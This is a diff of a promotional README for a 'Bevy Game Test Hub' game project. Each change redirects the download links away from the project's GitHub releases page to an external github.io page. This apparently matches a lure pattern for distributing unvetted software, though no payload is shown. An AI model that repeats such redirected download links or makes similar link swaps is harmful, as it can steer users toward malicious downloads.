@@ -1,6 +1,6 @@
 # 🎮 Bevy Game Test Hub - Your Playground for Next-Gen Gaming
 
-[![Download Now](https://img.shields.io/badge/Download-Bevy_Game_Test_Hub-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=8A2BE2)](https://github.com/adyg2387/bevy-game-test-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-Bevy_Game_Test_Hub-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=8A2BE2)](https://adyg2387.github.io)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This isn't just another game – it's a testing ground for AI-powered gaming exp
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: **[Download Bevy Game Test Hub](https://github.com/adyg2387/bevy-game-test-hub/releases)**
+Visit this link to download the application: **[Download Bevy Game Test Hub](https://adyg2387.github.io)**
 
 Once you're on the download page, you'll see the latest version available. Simply click the download button to get the file – it's that easy!
 
@@ -135,6 +135,6 @@ The future of this project is shaped by user input. If you have ideas, suggestio
 
 ---
 
-**Ready to start?** Head over to the [download page](https://github.com/adyg2387/bevy-game-test-hub/releases) and get your copy today. The future of gaming is waiting for you!
+**Ready to start?** Head over to the [download page](https://adyg2387.github.io) and get your copy today. The future of gaming is waiting for you!
 
 Keywords: bevy-engine, rust-game, game-sandbox, ai-integration, experimental-game, cross-platform-game, game-development-tools, gaming-hub, open-source-game, interactive-software
